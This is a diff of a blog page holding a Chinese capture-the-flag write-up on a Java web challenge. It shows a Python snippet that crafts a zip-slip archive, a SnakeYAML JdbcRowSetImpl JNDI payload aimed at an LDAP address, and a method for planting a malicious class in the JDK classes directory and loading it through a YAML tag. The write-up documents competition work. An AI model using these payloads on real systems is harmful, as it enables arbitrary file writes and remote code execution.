@@ -59,16 +59,24 @@
 </li>
 <li><p>&#x2F;unzip这里，注意看entry.getName()，没有做检查，也可以穿越，这个比较牛逼，不限后缀，且父目录不存在则会创建。怎么利用呢？像这样：</p>
 </li>
-<li><pre><code class="Python">import zipfile
-
-with zipfile.ZipFile(&#39;example.zip&#39;, &#39;w&#39;) as zipf:
-    zipf.write(&#39;your_file&#39;,&#39;../your_file.txt&#39;)
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.  这样的entry.getName()就是带../的。</span><br><span class="line"></span><br><span class="line">3.  直接使用unzip命令会跳过目录穿越：</span><br><span class="line"></span><br><span class="line">![image-20241128220132928.png](https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220132928.png)</span><br><span class="line"></span><br><span class="line">做法就是，绕过黑名单，然后直接打jndi。这种绕过写法，我也是第一次见。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
 </ol>
-<h2 id="TAG-tag-yaml-org-2002"><a href="#TAG-tag-yaml-org-2002" class="headerlink" title="%TAG !  tag:yaml.org,2002:"></a>%TAG !  tag:yaml.org,2002:</h2><p>!com.sun.rowset.JdbcRowSetImpl<br>dataSourceName: “ldap:&#x2F;&#x2F;127.0.0.1”<br>autoCommit: true</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 不出网打法</span><br><span class="line"></span><br><span class="line">好了，现在这题假如不出网怎么打？</span><br><span class="line"></span><br><span class="line">现场打的时候，直接打jndi不通外网的vps，所以花了好几个小时本地调试，排查问题，然后摸索不出网的打法。有点头绪之后，发现竟然通接入的vpn的本机ip，就直接打jndi。</span><br><span class="line"></span><br><span class="line">结束之后，继续之前的不出网打法思路，最终摸索出来了。</span><br><span class="line"></span><br><span class="line">思路：由于已经能达成任意文件写，所以想写一个恶意类，到jdk的类加载路径，然后使用yaml去触发反序列化。</span><br><span class="line"></span><br><span class="line">先确定jdk路径：/usr/lib/jvm/java-8-openjdk-amd64/jre/</span><br><span class="line"></span><br><span class="line">怎么确定的？本机的jdk8路径是这个，然后借助/upload的目录穿越，穿越到这里，如果这个目录存在，则正常上传文件，否则会提示报错信息。</span><br><span class="line"></span><br><span class="line">然后借助/upzip，写一个类，写到/usr/lib/jvm/java-8-openjdk-amd64/jre/classes下。这个目录下的类文件默认都会查找。</span><br><span class="line"></span><br><span class="line">恶意类：</span><br><span class="line"></span><br><span class="line">```Python</span><br><span class="line">public class UnkExp &#123;</span><br><span class="line"></span><br><span class="line">    public UnkExp()&#123;</span><br><span class="line">        //    Evil operation</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;example.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zipf:</span><br><span class="line">	zipf.write(<span class="string">&#x27;your_file&#x27;</span>,<span class="string">&#x27;../your_file.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样的entry.getName()就是带..&#x2F;的。</p>
+<p>直接使用unzip命令会跳过目录穿越：</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/mimic2024/image-20241128220132928.png" alt="image-20241128220132928.png"></p>
+<p>做法就是，绕过黑名单，然后直接打jndi。这种绕过写法，我也是第一次见。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%TAG !  tag:yaml.org,2002:</span><br><span class="line">---</span><br><span class="line">!com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">dataSourceName: &quot;ldap://127.0.0.1&quot;</span><br><span class="line">autoCommit: true</span><br></pre></td></tr></table></figure>
+
+<h2 id="不出网打法"><a href="#不出网打法" class="headerlink" title="不出网打法"></a>不出网打法</h2><p>好了，现在这题假如不出网怎么打？</p>
+<p>现场打的时候，直接打jndi不通外网的vps，所以花了好几个小时本地调试，排查问题，然后摸索不出网的打法。有点头绪之后，发现竟然通接入的vpn的本机ip，就直接打jndi。</p>
+<p>结束之后，继续之前的不出网打法思路，最终摸索出来了。</p>
+<p>思路：由于已经能达成任意文件写，所以想写一个恶意类，到jdk的类加载路径，然后使用yaml去触发反序列化。</p>
+<p>先确定jdk路径：&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;</p>
+<p>怎么确定的？本机的jdk8路径是这个，然后借助&#x2F;upload的目录穿越，穿越到这里，如果这个目录存在，则正常上传文件，否则会提示报错信息。</p>
+<p>然后借助&#x2F;upzip，写一个类，写到&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;classes下。这个目录下的类文件默认都会查找。</p>
+<p>恶意类：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">UnkExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    public UnkExp()&#123;</span><br><span class="line">        //    Evil operation</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>yaml</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%TAG !  tag:yaml.org,<span class="number">2002</span>:</span><br><span class="line">---</span><br><span class="line">!example.UnkExp</span><br></pre></td></tr></table></figure>
